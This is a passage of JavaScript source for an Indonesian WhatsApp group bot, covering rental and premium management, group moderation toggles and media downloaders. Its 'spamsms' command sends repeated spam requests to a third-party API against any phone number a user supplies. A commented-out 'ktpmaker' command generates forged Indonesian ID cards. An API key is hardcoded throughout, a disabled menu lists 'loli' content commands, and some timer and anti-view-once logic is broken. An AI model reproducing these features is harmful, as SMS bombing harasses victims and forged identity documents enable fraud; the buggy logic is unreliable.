							`Kamu memilih Kertas dan bot memilih Gunting\nKamu kalah`)
					}
				}
				break
				//------------------< Sewa >-------------------
			case 'sewa':
				if (!isGroup)
					return reply(
						mess
						.only
						.group
						)
				if (!isOwner &&
					!mek.key
					.fromMe)
					return reply(
						mess
						.only
						.owner
						)
				if (args
					.length < 1)
					return reply(
						`Penggunaan :\n*${prefix}sewa* add/del waktu`
						)
				if (args[0]
					.toLowerCase() ===
					'add') {
					_sewa
						.addSewaGroup(
							from,
							args[
								1
								],
							sewa
							)
					reply(
						`Success`)
				} else if (args[
						0]
					.toLowerCase() ===
					'del') {
					sewa.splice(
						_sewa
						.getSewaPosition(
							from,
							sewa
							),
						1)
					fs.writeFileSync(
						'./database/group/sewa.json',
						JSON
						.stringify(
							sewa
							)
						)
					reply(mess
						.success
						)
				} else {
					reply(
						`Penggunaan :\n*${prefix}sewa* add/del waktu`)
				}
				break
			case 'sewalist':
			case 'listsewa':
				if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
				let txtnyee =
					`List Sewa\nJumlah : ${sewa.length}\n\n`
				for (let i of
						sewa) {
					let cekvipp =
						ms(i.expired -
							Date
							.now()
							)
					txtnyee +=
						`*ID :* ${i.id} \n*Expire :* ${cekvipp.days} day(s) ${cekvipp.hours} hour(s) ${cekvipp.minutes} minute(s) ${cekvipp.seconds} second(s)\n\n`
				}
				reply(txtnyee)
				break

			case 'tutuptime':
			case 'closetime':
			case 'waktututup':
				if (isBanned) return reply(mess.baned)
				if (!isGroup)
					return reply(
						mess
						.only
						.group
						)
				if (!isBotGroupAdmins)
					return reply('Jadikan bot admin terlebih dahulu!')
				if (!
					isGroupAdmins &&
					!isOwner)
					return reply(
						mess
						.only
						.admin
						)

				if (args[1] ==
					"detik") {
					var timer =
						args[
						0] +
						"000"
				} else if (args[
						1] ==
					"menit") {
					var timer =
						args[
						0] +
						"0000"
				} else if (args[
						1] ==
					"jam") {
					var timer =
						args[
						0] +
						"00000"
				} else {
					return reply(
						`Command untuk menutup grup dengan waktu\n\nExample : ${prefix+command} 20 detik`
						)
				}
				reply(
					`[ ! ] Grup akan ditutup oleh bot dalam ${args[0]} ${args[1]} lagi.`)
				setTimeout(
				() => {
						var nomor =
							mek
							.participant
						varo
							.groupSettingChange(
								from,
								GroupSettingChange
								.messageSend,
								true
								);
					},
					timer)
				break
			case 'bukatime':
			case 'opentime':
			case 'waktubuka':
				if (isBanned) return reply(mess.baned)
				if (!isGroup)
					return reply(
						mess
						.only
						.group
						)
				if (!
					isGroupAdmins &&
					!isOwner)
					return reply(
						mess
						.only
						.admin
						)

				if (args[1] ==
					"detik") {
					var timer =
						args[
						0] +
						"000"
				} else if (args[
						1] ==
					"menit") {
					var timer =
						args[
						0] +
						"0000"
				} else if (args[
						1] ==
					"jam") {
					var timer =
						args[
						0] +
						"00000"
				} else {
					return reply(
						"Command untuk membuka grup dengan waktu\n\nExample : ${prefix+command} 20 detik"
						)
				}
				reply(
					`[ ! ] Grup akan dibuka oleh bot dalam ${args[0]} ${args[1]} lagi.`)
				setTimeout(
				() => {
						var nomor =
							mek
							.participant
						varo
							.groupSettingChange(
								from,
								GroupSettingChange
								.messageSend,
								false
								);
					},
					timer)
				break
			case 'sewacheck':
			case 'ceksewa':
				if (isBanned) return reply(mess.baned)
				if (!isGroup)
					return reply(
						mess
						.only
						.group
						)
				if (!isSewa)
					return reply(
						`Group ini tidak terdaftar dalam list sewabot`
						)
				let cekvip = ms(
					_sewa
					.getSewaExpired(
						from,
						sewa
						) -
					Date
					.now())
				let premiumnya =
					`   \`\`\`| SEWA EXPIRE |\`\`\`\n\n▷ *ID*: ${from}\n▷ *Expired :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s)`
				reply(
					premiumnya)
				break
			case 'spamsms':
				if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
				if (args
					.length == 0
					) return reply(
					`Example: ${prefix + command} 08303030303030`
					)
				nomor = args[0]
				await fetchJson(
					`https://api.lolhuman.xyz/api/sms/spam1?apikey=vxro2k21&nomor=${nomor}`
					)
				await fetchJson(
					`https://api.lolhuman.xyz/api/sms/spam2?apikey=vxro2k21&nomor=${nomor}`
					)
				await fetchJson(
					`https://api.lolhuman.xyz/api/sms/spam3?apikey=vxro2k21&nomor=${nomor}`
					)
				await fetchJson(
					`https://api.lolhuman.xyz/api/sms/spam4?apikey=vxro2k21&nomor=${nomor}`
					)
				await fetchJson(
					`https://api.lolhuman.xyz/api/sms/spam5?apikey=vxro2k21&nomor=${nomor}`
					)
				await fetchJson(
					`https://api.lolhuman.xyz/api/sms/spam6?apikey=vxro2k21&nomor=${nomor}`
					)
				await fetchJson(
					`https://api.lolhuman.xyz/api/sms/spam7?apikey=vxro2k21&nomor=${nomor}`
					)
				await fetchJson(
					`https://api.lolhuman.xyz/api/sms/spam8?apikey=vxro2k21&nomor=${nomor}`
					)
				reply("Success")
				break
				//------------------< Premium >-------------------
			case 'premium':
				if (!isOwner &&
					!mek.key
					.fromMe)
					return reply(
						mess
						.only
						.owner
						)
				if (args[0] ===
					'add') {
					if (mek
						.message
						.extendedTextMessage !=
						undefined
						) {
						mentioned
							=
							mek
							.message
							.extendedTextMessage
							.contextInfo
							.mentionedJid

						premium
							.addPremiumUser(
								mentioned[
									0
									],
								args[
									2
									],
								_premium
								)
						reply(
							`*| PREMIUM ADDED |*\n\n▷ *ID* : ${mentioned[0]}\n▷ *Expired* : ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s) ${ms(toMs(args[2])).seconds} second(s)`)

					} else {

						premium
							.addPremiumUser(
								args[
									1
									] +
								'@s.whatsapp.net',
								args[
									2
									],
								_premium
								)
						reply(
							`*| PREMIUM ADDED |*\n\n▷ *ID* : ${args[1]}@s.whatsapp.net\n▷ *Expired* : ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
					}
				} else if (args[
						0] ===
					'del') {
					if (mek
						.message
						.extendedTextMessage !=
						undefined
						) {
						mentioned
							=
							mek
							.message
							.extendedTextMessage
							.contextInfo
							.mentionedJid
						_premium
							.splice(
								premium
								.getPremiumPosition(
									mentioned[
										0
										],
									_premium
									),
								1
								)
						fs.writeFileSync(
							'./database/user/premium.json',
							JSON
							.stringify(
								_premium
								)
							)
						reply(mess
							.success
							)
					} else {
						_premium
							.splice(
								premium
								.getPremiumPosition(
									args[
										1
										] +
									'@s.whatsapp.net',
									_premium
									),
								1
								)
						fs.writeFileSync(
							'./database/user/premium.json',
							JSON
							.stringify(
								_premium
								)
							)
						reply('Sukses')
					}
				} else {
					reply(mess
						.wrongFormat
						)
				}
				break
			/*case 'faketoko':
				await getBuffer(
					teks =
					"Tahu Bacem",
					url_image =
					"https://i.ibb.co/JdfQ73m/photo-2021-02-05-10-13-39.jpg",
					title =
					"LoL Human",
					code =
					"IDR",
					price =
					1000000)
				break
			case 'ktpmaker':
				if (args
					.length == 0
					) return reply(
					`Usage: ${prefix + command} nik|provinsi|kabupaten|nama|tempat, tanggal lahir|jenis kelamin|jalan|rt/rw|kelurahan|kecamatan|agama|status nikah|pekerjaan|warga negara|berlaku sampai|url_image\n\nExample: ${prefix + command} 456127893132123|bumipertiwi|fatamorgana|varoBotWa|mars, 99-99-9999|belum ditemukan|jl wardoyo|999/999|turese|imtuni|alhamdulillah islam|jomblo kack|mikirin dia|indo ori no kw|hari kiamat|https://i.ibb.co/Xb2pZ88/test.jpg`
					)
				get_args = args
					.join(" ")
					.split("|")
				nik = get_args[
					0]
				prov = get_args[
					1]
				kabu = get_args[
					2]
				name = get_args[
					3]
				ttl = get_args[
					4]
				jk = get_args[5]
				jl = get_args[6]
				rtrw = get_args[
					7]
				lurah =
					get_args[8]
				camat =
					get_args[9]
				agama =
					get_args[10]
				nikah =
					get_args[11]
				kerja =
					get_args[12]
				warga =
					get_args[13]
				until =
					get_args[14]
				img = get_args[
					15]
				ini_buffer =
					await getBuffer(
						`https://api.lolhuman.xyz/api/ktpmaker?apikey=vxro2k21&nik=${nik}&prov=${prov}&kabu=${kabu}&name=${name}&ttl=${ttl}&jk=${jk}&jl=${jl}&rtrw=${rtrw}&lurah=${lurah}&camat=${camat}&agama=${agama}&nikah=${nikah}&kerja=${kerja}&warga=${warga}&until=${until}&img=${img}`
						)
				await varo
					.sendMessage(
						from,
						ini_buffer,
						image, {
							quoted: mek
						})
				break*/

			case "antilink":
				if (isBanned) return reply(mess.baned)
				if (!
					isGroupAdmins
					) return reply(
					mess
					.only
					.admin
					)
				if (!isGroup)
					return reply(
						mess
						.only
						.group
						)
				if (!
					isBotGroupAdmins
					) return reply(`Jadikan bot admin terlebih dahulu!`)
				if (!q) return reply(
					`Command untuk menyalakan/mematikan anti link group\n\nExample : ${prefix+command} enable`
					)
				if (args[0]
					.toLowerCase() ===
					'enable') {
					if (
						isAntiLink)
						return reply(
							`Udah aktif`
							)
					antilink
						.push(
							from
							)
					fs.writeFileSync(
						'./database/group/antilink.json',
						JSON
						.stringify(
							antilink
							)
						)
					reply(
						'Anti Link Group Diaktifkan!')
				} else if (args[
						0]
					.toLowerCase() ===
					'disable') {
					let anu =
						antilink
						.indexOf(
							from
							)
					antilink
						.splice(
							anu,
							1)
					fs.writeFileSync(
						'./database/group/antilink.json',
						JSON
						.stringify(
							antilink
							)
						)
					reply(
						'Anti Link Group Nonaktif')
				} else {
					reply(
						`Command untuk menyalakan/mematikan anti link group\n\nExample : ${prefix+command} enable`)
				}
				break;
				case "nsfw":
					if (isBanned) return reply(mess.baned)
					if (!
						isGroupAdmins
						) return reply(
						mess
						.only
						.admin
						)
					if (!isGroup)
						return reply(
							mess
							.only
							.group
							)
					if (!q) return reply(
						`Command untuk menyalakan/mematikan NSFW Fiture\n\nExample : ${prefix+command} enable`
						)
					if (args[0]
						.toLowerCase() ===
						'enable') {
						if (
							isNsfw)
							return reply(
								`Udah aktif`
								)
								nsfww
							.push(
								from
								)
						fs.writeFileSync(
							'./database/group/nsfww.json',
							JSON
							.stringify(
								nsfww
								)
							)
						reply(
							'Fitur NSFW Aktif!')
					} else if (args[
							0]
						.toLowerCase() ===
						'disable') {
						let anu =
						nsfww
							.indexOf(
								from
								)
								nsfww
							.splice(
								anu,
								1)
						fs.writeFileSync(
							'./database/group/nsfww.json',
							JSON
							.stringify(
								nsfww
								)
							)
						reply(
							'Fitur NSFW Nonaktif')
					} else {
						reply(
							`Command untuk menyalakan/mematikan NSFW Fiture\n\nExample : ${prefix+command} enable`)
					}
					break;
				case "antiviewonce":
					if (isBanned) return reply(mess.baned)
					if (!
						isGroupAdmins
						) return reply(
						mess
						.only
						.admin
						)
					if (!isGroup)
						return reply(
							mess
							.only
							.group
							)
					if (!q) return reply(
						`Command untuk menyalakan/mematikan AntiViewOnce yaitu fitur untuk mengirim kembali foto/video yang hanya bisa dilihat 1x\n\nExample : ${prefix+command} enable`
						)
					if (args[0]
						.toLowerCase() ===
						'enable') {
						if (
							isNsfw)
							return reply(
								`Udah aktif`
								)
								nsfww
							.push(
								from
								)
						fs.writeFileSync(
							'./database/group/antiviewonce.json',
							JSON
							.stringify(
								antiviewonce
								)
							)
						reply(
							'Fitur AntiViewOnce Aktif!')
					} else if (args[
							0]
						.toLowerCase() ===
						'disable') {
						let anu =
						nsfww
							.indexOf(
								from
								)
								nsfww
							.splice(
								anu,
								1)
						fs.writeFileSync(
							'./database/group/antiviewonce.json',
							JSON
							.stringify(
								nsfww
								)
							)
						reply(
							'Fitur NSFW Nonaktif')
					} else {
						reply(
							`Command untuk menyalakan/mematikan AntiViewOnce yaitu fitur untuk mengirim kembali foto/video yang hanya bisa dilihat 1x\n\nExample : ${prefix+command} enable`)
					}
					break;
				case "antinsfw":
					if (isBanned) return reply(mess.baned)
					if (!
						isGroupAdmins
						) return reply(
						mess
						.only
						.admin
						)
					if (!isGroup)
						return reply(
							mess
							.only
							.group
							)
					if (!
						isBotGroupAdmins
						) return reply(`Jadikan bot admin terlebih dahulu!`)
					if (!q) return reply(
						`Command untuk menyalakan/mematikan Anti NSFW Fiture yaitu untuk mengeluarkan user dari group yang mengirim gambar vulgar/porno\n\nExample : ${prefix+command} enable`
						)
					if (args[0]
						.toLowerCase() ===
						'enable') {
						if (
							isAntiNsfw)
							return reply(
								`Udah aktif`
								)
						antinsfww
							.push(
								from
								)
						fs.writeFileSync(
							'./database/group/antinsfww.json',
							JSON
							.stringify(
								antinsfww
								)
							)
						reply(
							'Fitur Anti NSFW Aktif!')
					} else if (args[
							0]
						.toLowerCase() ===
						'disable') {
						let anu =
							antinsfww
							.indexOf(
								from
								)
						antinsfww
							.splice(
								anu,
								1)
						fs.writeFileSync(
							'./database/group/antinsfww.json',
							JSON
							.stringify(
								antinsfww
								)
							)
						reply(
							'Fitur Anti NSFW Nonaktif')
					} else {
						reply(
							`Command untuk menyalakan/mematikan Anti NSFW Fiture yaitu untuk mengeluarkan user dari group yang mengirim gambar vulgar/porno\n\nExample : ${prefix+command} enable`)
					}
					break;
			case 'premiumcheck':
			case 'cekpremium':
				if (!isPremium)
					return reply(
						mess
						.only
						.premium
						)
				const cekExp =
					ms(await premium
						.getPremiumExpired(
							sender,
							_premium
							) -
						Date
						.now())
				reply(
					`*| PREMIUM CHECK |*\n\n▷ *Nama*: @${sender.split("@")[0]}\n▷ *Sisa Waktu*: ${cekExp.days} day(s) ${cekExp.hours} hour(s) ${cekExp.minutes} minute(s) ${cekExp.seconds} second(s)`)
				break
			case 'listprem':
			case 'listpremium':
				if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
				let txt =
					`*| MEMBER PREMIUM |*\n\n`
				let men = [];
				for (let i of
						_premium) {
					men.push(i
						.id)
					const
						checkExp =
						ms(i.expired -
							Date
							.now()
							)
					txt +=
						`▷ *ID :* @${i.id.split("@")[0]}\n▷ *Expired*: ${checkExp.days} day(s) ${checkExp.hours} hour(s) ${checkExp.minutes} minute(s) ${checkExp.seconds} second(s)\n\n`
				}
				mentions(txt,
					men,
					true)
				break

       case 'belipremium':
       case 'buypremium':
       case 'sewabot':
              teksnya = `*── | PRICE LIST | ──*

*<+>* Sewa Bot : Rp.10k/bulan
*<+>* Member Premium : Rp.10k/bulan
*<+>* Sewa + Premium : Rp.15k/bulan

*── | KEUNTUNGAN | ──*

*<+>* Unlimited Limit
*<+>* Fitur Premium
*<+>* Fitur Private Chat

*OFFICIAL GROUP*
https://chat.whatsapp.com/Fuv1iuMthEu6QNIdp7MrS9

Mau nyewa? Hubungi @6289516998339`
              reply(teksnya)
              break             
//------------------< bayar menu >-------------------  
/* case 'bayar':
gopeynya = 'https://telegra.ph/file/dc85e75f91277070254e5.jpg'
teksnya = ` *「PAYMENT」*
▷ GOPAY : scan diatas
▷ DANA : 085298064466
▷ ALL QR : chat owner
▷ QRISS GOPAY DI ATAS 
━━━━━━━━━━━━━━━━━━━━`
        varo.sendMessage(from, await getBuffer(gopeynya), image, {quoted: ftoko, caption: teksnya })
              break*/

			/*case 'buttonstik':
				gopeynya =
					'https://telegra.ph/file/dc85e75f91277070254e5.jpg'
				teksnya = `*「MENU STICKER」*
*き⃟▷ ${prefix}attp* _teks_
*き⃟▷ ${prefix}ttp* _teks_
*き⃟▷ ${prefix}dadu*
*き⃟▷ ${prefix}doge*
*き⃟▷ ${prefix}patrick*
*き⃟▷ ${prefix}gura*
*き⃟▷ ${prefix}stickeranime*
*き⃟▷ ${prefix}semoji* _emoji_
*き⃟▷ ${prefix}sticker* _reply foto/video_
*き⃟▷ ${prefix}smeme* _teks|teks_
*き⃟▷️ ${prefix}swm* _pack|author_
*き⃟▷️ ${prefix}take* _pack|author_`
				varo
					.sendMessage(
						from,
						await getBuffer(
							gopeynya
							),
						image, {
							quoted: ftoko,
							caption: teksnya
						})
				break
			case 'buttondl':
				gopeynya =
					'https://telegra.ph/file/dc85e75f91277070254e5.jpg'
				teksnya = `*「DOWNLOAD MENU」*
*き⃟▷ ${prefix}fbdl*
*き⃟▷ ${prefix}igdl*
*き⃟▷ ${prefix}twitter*
*き⃟▷ ${prefix}play*
*き⃟▷ ${prefix}ythd*
*き⃟▷ ${prefix}ytmp3*
*き⃟▷ ${prefix}ytmp4*
*き⃟▷ ${prefix}soundcloud*
*き⃟▷ ${prefix}tiktokdl*
*き⃟▷ ${prefix}tiktoknowm*
*き⃟▷ ${prefix}tiktokmp3*
*き⃟▷ ${prefix}mediafire*
*き⃟▷ ${prefix}nhentaipdf* _code_`
				varo
					.sendMessage(
						from,
						await getBuffer(
							gopeynya
							),
						image, {
							quoted: ftoko,
							caption: teksnya
						})
				break
			case 'buttonpen':
				gopeynya =
					'https://telegra.ph/file/dc85e75f91277070254e5.jpg'
				teksnya = `*「NULIS MENU」*
*き⃟▷ ${prefix}nulis*`
				varo
					.sendMessage(
						from,
						await getBuffer(
							gopeynya
							),
						image, {
							quoted: ftoko,
							caption: teksnya
						})
				break
			case 'buttongame':
				gopeynya =
					'https://telegra.ph/file/dc85e75f91277070254e5.jpg'
				teksnya =
					`*「GAME MENU」*
き⃟▷ ${prefix}limitgame*
*き⃟▷ ${prefix}slot*
*き⃟▷ ${prefix}gelud* _@tag_
*き⃟▷ ${prefix}tictactoe* _@tag_
*き⃟▷ ${prefix}siapaaku*
*き⃟▷ ${prefix}family100*
*き⃟▷ ${prefix}kuismath*
*き⃟▷ ${prefix}asahotak*
*き⃟▷ ${prefix}tebaklirik*
*き⃟▷ ${prefix}tebaklagu*
*き⃟▷ ${prefix}tebakkata*
*き⃟▷ ${prefix}susunkata*
*き⃟▷ ${prefix}kimiakuis*
*き⃟▷ ${prefix}caklontong*
*き⃟▷ ${prefix}tebakjenaka*
*き⃟▷ ${prefix}tebakanime*
*き⃟▷ ${prefix}tebaktebakan*
*き⃟▷ ${prefix}tebakgambar*
*き⃟▷ ${prefix}tebakumur*
*き⃟▷ ${prefix}tebakbendera*
*き⃟▷ ${prefix}suit* _batu/kertas/gunting_`
				varo
					.sendMessage(
						from,
						await getBuffer(
							gopeynya
							),
						image, {
							quoted: ftoko,
							caption: teksnya
						})
				break
			case 'buttongc':
				gopeynya =
					'https://telegra.ph/file/dc85e75f91277070254e5.jpg'
				teksnya = `*「GRUP MENU」*
*き⃟▷ ${prefix}groupsetting*
*き⃟▷ ${prefix}getbio* _reply_
*き⃟▷ ${prefix}afk* _alasan_
*き⃟▷ ${prefix}kontak* _nomor|nama_
*き⃟▷ ${prefix}ceksewa*
*き⃟▷ ${prefix}kickall*
*き⃟▷ ${prefix}infogrup*
*き⃟▷ ${prefix}promote*
*き⃟▷ ${prefix}promoteall*
*き⃟▷ ${prefix}demote*
*き⃟▷ ${prefix}demoteall*
*き⃟▷ ${prefix}listonline*
*き⃟▷ ${prefix}tagall* _teks_
*き⃟▷ ${prefix}leave*
*き⃟▷ ${prefix}kick* _reply_
*き⃟▷ ${prefix}add* _628xxx_
*き⃟▷ ${prefix}setnamegc*
*き⃟▷ ${prefix}setppgc*
*き⃟▷ ${prefix}getpp*
*き⃟▷ ${prefix}setdeskgc*
*き⃟▷ ${prefix}sider* _reply chat bot_
*き⃟▷ ${prefix}hidetag* _teks/reply teks_
*き⃟▷ ${prefix}linkgc*
*き⃟▷ ${prefix}getdeskgc*`
				varo
					.sendMessage(
						from,
						await getBuffer(
							gopeynya
							),
						image, {
							quoted: ftoko,
							caption: teksnya
						})
				break
			case 'buttonwibu':
				gopeynya =
					'https://telegra.ph/file/dc85e75f91277070254e5.jpg'
				teksnya = `*「WIBU MENU」*
*き⃟▷ ${prefix}loli*
*き⃟▷ ${prefix}manga*
*き⃟▷ ${prefix}anime*
*き⃟▷️ ${prefix}lolivideo*
*き⃟▷ ${prefix}husbu*
*き⃟▷️ ${prefix}waifu*
*き⃟▷️ ${prefix}milf*
*き⃟▷ ${prefix}neko*
*き⃟▷️ ${prefix}kanna*
*き⃟▷ ${prefix}sagiri*
*き⃟▷ ${prefix}hentai*
*き⃟▷ ${prefix}cosplay*
*き⃟▷️ ${prefix}wallnime*
*き⃟▷️ ${prefix}kusonime*
*き⃟▷️ ${prefix}megumin*
*き⃟▷ ${prefix}otakudesu*
*き⃟▷️ ${prefix}doujindesu*
*き⃟▷️ ${prefix}storyanime*
*き⃟▷️ ${prefix}otakuongoing*
*き⃟▷ ${prefix}nhentai *code*
*き⃟▷️ ${prefix}nekopoi _link_*
*き⃟▷️ ${prefix}nekopoi3d*
*き⃟▷️ ${prefix}nekopoicosplay*
*き⃟▷ ${prefix}nekopoisearch*`
				varo
					.sendMessage(
						from,
						await getBuffer(
							gopeynya
							),
						image, {
							quoted: ftext,
							caption: teksnya
						})
				break
			case 'buttonown':
				gopeynya =
					'https://telegra.ph/file/dc85e75f91277070254e5.jpg'
				teksnya = `*「OWNER MENU」*
*き⃟▷️ ${prefix}bc* _teks_
*き⃟▷ ${prefix}tobc* _audio_
*き⃟▷ ${prefix}term*
*き⃟▷ ${prefix}eval*
*き⃟▷ ${prefix}clearall*
*き⃟▷ ${prefix}leaveall*
*き⃟▷ ${prefix}join* _teks_
*き⃟▷️ ${prefix}shutdown*
*き⃟▷ ${prefix}getquoted*
*き⃟▷ ${prefix}addupdate* _fiturnya_
*き⃟▷️ ${prefix}exif* _nama|author_
*き⃟▷ ${prefix}sewa add/del* _waktunya_
*き⃟▷️ ${prefix}premium add* _@tag|nomor_
*き⃟▷ ${prefix}premium del* _@tag|nomor_
*き⃟▷ ${prefix}setpp*
*き⃟▷ ${prefix}setbio*
*き⃟▷ ${prefix}setname*
*き⃟▷ ${prefix}getpp*
*き⃟▷ ${prefix}sharelock*
*き⃟▷ ${prefix}chat* _nomor|teks_`
				varo
					.sendMessage(
						from,
						await getBuffer(
							gopeynya
							),
						image, {
							quoted: ftext,
							caption: teksnya
						})
				break*/


				//------------------< Sticker Cmd >-------------------
			case 'addcmd':
			case 'setcmd':
				if (!isOwner &&
					!mek.key
					.fromMe)
					return reply(
						mess
						.only
						.owner
						)
				if (
					isQuotedSticker) {
					if (!q)
						return reply(
							`Penggunaan : ${prefix+command} cmdnya dan tag stickernya`
							)
					var kodenya =
						mek
						.message
						.extendedTextMessage
						.contextInfo
						.quotedMessage
						.stickerMessage
						.fileSha256
						.toString(
							'base64'
							)
					addCmd(kodenya,
						q)
					textImg(
						"Done!")
				} else {
					reply(
						'tag stickernya')
				}
				break
			case 'delcmd':
				if (!isOwner &&
					!mek.key
					.fromMe)
					return reply(
						mess
						.only
						.owner
						)
				if (!
					isQuotedSticker
					) return reply(
					`Penggunaan : ${command} tagsticker`
					)
				var kodenya =
					mek.message
					.extendedTextMessage
					.contextInfo
					.quotedMessage
					.stickerMessage
					.fileSha256
					.toString(
						'base64'
						)
				_scommand
					.splice(
						getCommandPosition(
							kodenya
							), 1
						)
				fs.writeFileSync(
					'./database/bot/scommand.json',
					JSON
					.stringify(
						_scommand
						))
				textImg("Done!")
				break
			case 'listcmd':
				if (isBanned) return reply(mess.baned)
				let teksnyee =
					`\`\`\`| LIST STICKER CMD |\`\`\``
				let cemde = [];
				for (let i of
						_scommand) {
					cemde.push(i
						.id)
					teksnyee +=
						`\n\n▷ *ID :* ${i.id}\n▷ *Cmd* : ${i.chats}`
				}
				mentions(
					teksnyee,
					cemde,
					true)
				break
			case 'addrespon': {
				if (!isOwner &&
					!mek.key
					.fromMe)
					return reply(
						mess
						.owner
						)
				if (args
					.length < 1)
					return reply(
						`Penggunaan ${prefix}addrespon key|respon\n\nContoh : ${prefix}addrespon hai|juga`
						)
				let input1 =
					body.slice(
						11)
				if (!input1
					.includes(
						'|'))
					return reply(
						`Penggunaan ${prefix}addrespon key|respon\n\nContoh : ${prefix}addrespon hai|juga`
						)
				let input =
					input1
					.split("|")
				if (checkCommands(
						input[
						0],
						commandsDB
						) ===
					true)
				return reply(
						`Command tersebut sudah ada`
						)
				addCommands(
					input[
					0],
					input[
					1],
					sender,
					commandsDB
					)
				reply(
					`Key : ${input[0]}\nRespon : ${input[1]}\n\nRespon berhasil di set`)
			}
			break
		case 'dellrespon':
		case 'delrespon': {
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.owner)
			if (args.length < 1)
				return reply(
					`Penggunaan ${prefix}delrespon key\n\nContoh : ${prefix}delrespon hai`
					)
			if (!checkCommands(
					body.slice(
						11),
					commandsDB))
				return reply(
					`Key tersebut tidak ada di database`
					)
			deleteCommands(body
				.slice(11),
				commandsDB)
			reply(
				`Berhasil menghapus respon dengan key ${body.slice(11)}`)
		}
		break
		case 'listrespon': {
			let txt =
				`List Respon\nTotal : ${commandsDB.length}\n\n`
			for (let i = 0; i <
				commandsDB
				.length; i++) {
				txt +=
					`❏ Key : ${commandsDB[i].pesan}\n`
			}
			reply(txt)
		}
		break
		//------------------< self and public >---------------------
		//------------------< Downloader/Search/Anime >-------------------
		case 'instagram':
                case 'ig':
					if (isBanned) return reply(mess.baned)
					if (isLimit(sender,
						isPremium,
						isOwner,
						limitCount,
						limit))
					return reply(
						mess
						.limit)
					if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (!q) return reply(`Command untuk mendownload post dari instagram\n\n| List Command |\n▷ ${prefix+command} foto\n▷ ${prefix+command} video\n▷ ${prefix+command} reels\n▷ ${prefix+command} tv\n\nExample:\n${prefix+command} foto https://www.instagram.com/p/CW6JMIvPnkD/\n\nPastikan akun instagram tidak private!`)
			if (!isUrl(args[
				1]) && !args[1]
				.includes(
					'instagram'))
				return reply(
					mess
					.error
					.Iv)
			if (args[0] ==='foto') {

					reply(`Tunggu sebentar...`)
                                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/instagram?apikey=vxro2k21&url=${args[1]}`)
                                    resultan = get_result.result
					for (let i of resultan) {
							    buffer = await getBuffer(i)
								await varo.sendMessage(from, buffer, image, { quoted: mek, caption: `${args[1]}`, thumbnail: fs.readFileSync('./VXROMD/vxrobot.jpg')});
								limitAdd(sender,
									limit)
								//await limitAdd(sender)
					}
					 } if (args[0] ==='video') {

					reply(`Tunggu sebentar...`)
                                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/instagram?apikey=vxro2k21&url=${args[1]}`)
                                    resultan = get_result.result
					for (let i of resultan) {
							    buffer = await getBuffer(i)
								await varo.sendMessage(from, buffer, video, { quoted: mek, caption: `${args[1]}`, thumbnail: fs.readFileSync('./VXROMD/vxrobot.jpg')});
								//await limitAdd(sender)
								limitAdd(sender,
									limit)
					}
						} else if (args[0] ==='reels') {

					reply(`Tunggu sebentar...`)
                                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/instagram?apikey=vxro2k21&url=${args[1]}`)
                                    resultan = get_result.result
					for (let i of resultan) {
							    buffer = await getBuffer(i)
								await varo.sendMessage(from, buffer, video, { quoted: mek, caption: `${args[1]}`, thumbnail: fs.readFileSync('./VXROMD/vxrobot.jpg')});
								//await limitAdd(sender)
								limitAdd(sender,
									limit)
					}
						} else if (args[0] ==='tv') {

					reply(`Tunggu sebentar...`)
                                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/instagram?apikey=vxro2k21&url=${args[1]}`)
                                    resultan = get_result.result
					for (let i of resultan) {
							    buffer = await getBuffer(i)
								await varo.sendMessage(from, buffer, video, { quoted: mek, caption: `${args[1]}`, thumbnail: fs.readFileSync('./VXROMD/vxrobot.jpg')});
								//await limitAdd(sender)
								limitAdd(sender,
									limit)
					}
						} if (args[0] ==='story') {

					reply(`Tunggu sebentar...`)
                                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/igstory/${args[1]}?apikey=vxro2k21`)
                                    resultan = get_result.result
					for (let i of resultan) {
						sendMediaURL(from,`${i}`,`${args[1]}`)
					}
									}
								
			break
		case 'snack':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (args.length ==
				0) return reply(
					`Command untuk mendownload video dari aplikasi snack video\n\nExample : ${prefix+command} http://sck.io/p/kdNLLeuP`
				)
				if (!isUrl(args[
					0]) && !args[0]
					.includes(
						'sck'))
					return reply(
						mess
						.error
						.Iv)
			ini_url = args[0]
			ini_url =
				await fetchJson(
					`https://api.lolhuman.xyz/api/snackvideo?apikey=vxro2k21&url=${ini_url}`
					)
			ini_url = ini_url
				.result
			ini_url = ini_url
				.link
			//  if (ini_url.link(".mp4")) ini_type = video
			ini_buffer =
				await getBuffer(
					ini_url)
			await varo
				.sendMessage(
					from,
					ini_buffer,
					video, {
						quoted: mek
					})
					limitAdd(sender,
						limit)
			break
		case 'whatanime':
		case 'sauce':
